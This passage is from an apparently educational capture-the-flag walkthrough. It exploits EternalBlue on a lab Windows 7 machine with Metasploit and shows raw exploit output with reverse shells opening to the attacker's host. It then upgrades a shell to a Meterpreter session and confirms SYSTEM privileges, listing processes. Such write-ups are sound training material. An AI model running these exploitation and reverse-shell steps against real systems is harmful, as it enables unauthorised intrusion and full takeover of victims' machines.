</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command shell session <span class=m>2</span> opened <span class=o>(</span>10.8.33.96:4444 -&gt; 10.10.14.17:49173 <span class=o>)</span> at 2022-04-09 02:35:37 +0200
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command shell session <span class=m>4</span> opened <span class=o>(</span>10.8.33.96:4444 -&gt; 10.10.14.17:49175 <span class=o>)</span> at 2022-04-09 02:35:37 +0200
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command shell session <span class=m>1</span> opened <span class=o>(</span>10.8.33.96:4444 -&gt; 10.10.14.17:49172 <span class=o>)</span> at 2022-04-09 02:35:37 +0200
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command shell session <span class=m>3</span> opened <span class=o>(</span>10.8.33.96:4444 -&gt; 10.10.14.17:49174 <span class=o>)</span> at 2022-04-09 02:35:37 +0200
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command shell session <span class=m>5</span> opened <span class=o>(</span>10.8.33.96:4444 -&gt; 10.10.14.17:49176 <span class=o>)</span> at 2022-04-09 02:35:37 +0200
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>336</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-WIN-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.14.17:445 - <span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>-<span class=o>=</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Shell Banner:
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.1.7601<span class=o>]</span>
</span></span><span class=line><span class=cl>-----
</span></span><span class=line><span class=cl>          
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;
</span></span></code></pre></td></tr></table></div></div><p>I successfully exploited Eternal Blue and got a reverse shell from the victim.</p><ul><li>Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.</li></ul><p>I backgrounded the shell session using <code>CTRL + Z</code></p><hr><h2 id=task-3-escalate>Task 3: Escalate</h2><h3 id=escalate-privileges-learn-how-to-upgrade-shells-in-metasploit>Escalate privileges, learn how to upgrade shells in metasploit.</h3><hr><ul><li>If you haven&rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</li></ul><p>I backgrounded the shell using CTRL + Z</p><p>Let&rsquo;s search the correct post-exploitation module to convert this basic shell
to a meterpreter shell!</p><p><code>msf6 exploit(windows/smb/ms17_010_eternalblue) > search -t post meterpreter</code></p><p>This one sounds good: <code>post/multi/manage/shell_to_meterpreter</code></p><ul><li>Select this (use MODULE_PATH). Show options, what option are we required to change?</li></ul><p><code>msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt; show options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options <span class=o>(</span>post/multi/manage/shell_to_meterpreter<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name     Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----     ---------------  --------  -----------
</span></span><span class=line><span class=cl>   HANDLER  <span class=nb>true</span>             yes       Start an exploit/multi/handler to receive the connection
</span></span><span class=line><span class=cl>   LHOST                     no        IP of host that will receive the connection from the payload <span class=o>(</span>Will try to auto d
</span></span><span class=line><span class=cl>                                       etect<span class=o>)</span>.
</span></span><span class=line><span class=cl>   LPORT    <span class=m>4433</span>             yes       Port <span class=k>for</span> payload to connect to.
</span></span><span class=line><span class=cl>   SESSION                   yes       The session to run this module on
</span></span></code></pre></td></tr></table></div></div><p>The options we need to set is the <code>SESSION</code> option.</p><ul><li>Set the required option, you may need to list all of the sessions to find your target here.</li></ul><p>Let&rsquo;s find the correct session first.</p><p>I have a ton of sessions open&mldr; I will try the first one.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt; sessions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Active <span class=nv>sessions</span>
</span></span><span class=line><span class=cl><span class=o>===============</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Id   Name  Type               Information                                 Connection
</span></span><span class=line><span class=cl>  --   ----  ----               -----------                                 ----------
</span></span><span class=line><span class=cl>  <span class=m>1</span>          shell x64/windows  Shell Banner: Microsoft Windows <span class=o>[</span>Version <span class=m>6</span>  10.8.33.96:4444 -&gt; 10.10.14.17:49172  <span class=o>(</span>10.1
</span></span><span class=line><span class=cl>                                .1.7601<span class=o>]</span> -----                              0.14.17<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt; <span class=nb>set</span> SESSION <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=nv>SESSION</span> <span class=o>=</span>&gt; <span class=m>1</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Run! If this doesn&rsquo;t work, try completing the exploit from the previous task once more.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Upgrading session ID: <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting exploit/multi/handler
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.8.33.96:4433 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Post module execution completed
</span></span></code></pre></td></tr></table></div></div><p>That did not work.</p><p>I will try it with the last one&mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt; <span class=nb>set</span> SESSION <span class=m>264</span>
</span></span><span class=line><span class=cl><span class=nv>SESSION</span> <span class=o>=</span>&gt; <span class=m>264</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Upgrading session ID: <span class=m>264</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting exploit/multi/handler
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.8.33.96:4433 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Post module execution completed
</span></span><span class=line><span class=cl>msf6 post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt; 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>200262</span> bytes<span class=o>)</span> to 10.10.14.17
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>265</span> opened <span class=o>(</span>10.8.33.96:4433 -&gt; 10.10.14.17:49701 <span class=o>)</span> at 2022-04-09 02:50:03 +0200
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Stopping exploit/multi/handler
</span></span></code></pre></td></tr></table></div></div><p>Ok so this looks way better!</p><ul><li>Once the meterpreter shell conversion completes, select that session for use.</li></ul><p>After looking at the sessions with the command <code>sessions</code>
I saw a new session</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=m>265</span>        meterpreter x64/windows  NT AUTHORITY<span class=se>\S</span>YSTEM @ JON-PC             10.8.33.96:4433 -&gt; 10.10.14.17:49701  <span class=o>(</span><span class=m>1</span>
</span></span><span class=line><span class=cl>                                                                               0.10.14.17<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try to interact with it!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt; sessions -i <span class=m>265</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting interaction with 265...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>meterpreter &gt;
</span></span></code></pre></td></tr></table></div></div><p>We finally got a meterpreter shell!</p><p>And it is working:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; sysinfo
</span></span><span class=line><span class=cl>Computer        : JON-PC
</span></span><span class=line><span class=cl>OS              : Windows <span class=m>7</span> <span class=o>(</span>6.1 Build 7601, Service Pack 1<span class=o>)</span>.
</span></span><span class=line><span class=cl>Architecture    : x64
</span></span><span class=line><span class=cl>System Language : en_US
</span></span><span class=line><span class=cl>Domain          : WORKGROUP
</span></span><span class=line><span class=cl>Logged On Users : <span class=m>0</span>
</span></span><span class=line><span class=cl>Meterpreter     : x64/windows
</span></span></code></pre></td></tr></table></div></div><p>We can see that the system is running Windows 7 x64</p><ul><li>Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command &lsquo;shell&rsquo; and run &lsquo;whoami&rsquo;. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.</li></ul><p>Using the getuid command I can see with which user we are currently interacting with</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; getuid
</span></span><span class=line><span class=cl>Server username: NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span></code></pre></td></tr></table></div></div><p>Looks like we got system rights. The user NT AUTHORITY\SYSTEM has even more
rights than an administrator under Windows.</p><ul><li>List all of the processes running via the &lsquo;ps&rsquo; command. Just because we are system doesn&rsquo;t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; ps
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Process <span class=nv>List</span>
</span></span><span class=line><span class=cl><span class=o>============</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> PID   PPID  Name                 Arch  Session  User                          Path
</span></span><span class=line><span class=cl> ---   ----  ----                 ----  -------  ----                          ----
</span></span><span class=line><span class=cl> <span class=m>0</span>     <span class=m>0</span>     <span class=o>[</span>System Process<span class=o>]</span>
</span></span><span class=line><span class=cl> <span class=m>4</span>     <span class=m>0</span>     System               x64   <span class=m>0</span>
</span></span><span class=line><span class=cl> <span class=m>416</span>   <span class=m>4</span>     smss.exe             x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           <span class=se>\S</span>ystemRoot<span class=se>\S</span>ystem32<span class=se>\s</span>mss.exe
</span></span><span class=line><span class=cl> <span class=m>460</span>   <span class=m>668</span>   LogonUI.exe          x64   <span class=m>1</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\L</span>ogonUI.exe
</span></span><span class=line><span class=cl> <span class=m>484</span>   <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span><span class=line><span class=cl> <span class=m>568</span>   <span class=m>560</span>   csrss.exe            x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\c</span>srss.exe
</span></span><span class=line><span class=cl> <span class=m>616</span>   <span class=m>560</span>   wininit.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\w</span>ininit.exe
</span></span><span class=line><span class=cl> <span class=m>628</span>   <span class=m>608</span>   csrss.exe            x64   <span class=m>1</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\c</span>srss.exe
</span></span><span class=line><span class=cl> <span class=m>668</span>   <span class=m>608</span>   winlogon.exe         x64   <span class=m>1</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\w</span>inlogon.exe
</span></span><span class=line><span class=cl> <span class=m>716</span>   <span class=m>616</span>   services.exe         x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\s</span>ervices.exe
</span></span><span class=line><span class=cl> <span class=m>724</span>   <span class=m>616</span>   lsass.exe            x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\l</span>sass.exe
</span></span><span class=line><span class=cl> <span class=m>732</span>   <span class=m>616</span>   lsm.exe              x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\l</span>sm.exe
</span></span><span class=line><span class=cl> <span class=m>788</span>   <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span><span class=line><span class=cl> <span class=m>844</span>   <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span><span class=line><span class=cl> <span class=m>912</span>   <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\N</span>ETWORK SERVICE
</span></span><span class=line><span class=cl> <span class=m>960</span>   <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\L</span>OCAL SERVICE
</span></span><span class=line><span class=cl> <span class=m>1124</span>  <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\L</span>OCAL SERVICE
</span></span><span class=line><span class=cl> <span class=m>1216</span>  <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\N</span>ETWORK SERVICE
</span></span><span class=line><span class=cl> <span class=m>1244</span>  <span class=m>716</span>   TrustedInstaller.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span><span class=line><span class=cl>             e
</span></span><span class=line><span class=cl> <span class=m>1324</span>  <span class=m>716</span>   spoolsv.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\s</span>poolsv.exe
</span></span><span class=line><span class=cl> <span class=m>1368</span>  <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\L</span>OCAL SERVICE
</span></span><span class=line><span class=cl> <span class=m>1388</span>  <span class=m>568</span>   conhost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\c</span>onhost.exe
</span></span><span class=line><span class=cl> <span class=m>1464</span>  <span class=m>2564</span>  powershell.exe       x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\W</span>indowsPowerShell<span class=se>\v</span>
</span></span><span class=line><span class=cl>                                                                               1.0<span class=se>\p</span>owershell.exe
</span></span><span class=line><span class=cl> <span class=m>1468</span>  <span class=m>716</span>   amazon-ssm-agent.ex  x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\P</span>rogram Files<span class=se>\A</span>mazon<span class=se>\S</span>SM<span class=se>\a</span>mazon-ssm-
</span></span><span class=line><span class=cl>             e                                                                 agent.exe
</span></span><span class=line><span class=cl> <span class=m>1524</span>  <span class=m>716</span>   LiteAgent.exe        x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\P</span>rogram Files<span class=se>\A</span>mazon<span class=se>\X</span>enTools<span class=se>\L</span>iteAg
</span></span><span class=line><span class=cl>                                                                               ent.exe
</span></span><span class=line><span class=cl> <span class=m>1680</span>  <span class=m>716</span>   Ec2Config.exe        x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\P</span>rogram Files<span class=se>\A</span>mazon<span class=se>\E</span>c2ConfigServic
</span></span><span class=line><span class=cl>                                                                               e<span class=se>\E</span>c2Config.exe
</span></span><span class=line><span class=cl> <span class=m>1964</span>  <span class=m>844</span>   WmiPrvSE.exe         x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\w</span>bem<span class=se>\w</span>miprvse.exe
</span></span><span class=line><span class=cl> <span class=m>1980</span>  <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\N</span>ETWORK SERVICE
